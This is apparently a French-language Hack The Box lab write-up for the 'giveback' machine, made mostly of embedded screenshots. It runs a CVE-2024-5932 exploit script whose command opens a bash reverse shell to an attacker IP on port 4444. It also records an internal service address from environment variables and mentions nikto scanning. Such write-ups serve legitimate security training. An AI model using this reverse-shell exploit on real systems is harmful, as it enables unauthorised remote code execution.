


![[IMG-20260115182823570.png]]

```
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"
```


![[IMG-20260115190938163.png]]


![[IMG-20260115190900250.png]]

![[IMG-20260115194320820.png]]

Machine Cible:
![[IMG-20260115194345293.png]]

Machine atttaquante:
![[IMG-20260115194433931.png]]
![[IMG-20260116030630630.png]]
![[IMG-20260116030316748.png]]

Variable environnement:
![[IMG-20260116030342781.png]]

```
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
```

![[IMG-20260116030420077.png]]

On utilise nikto pour footprinter les siteweb:
![[IMG-20260116031357685.png]]

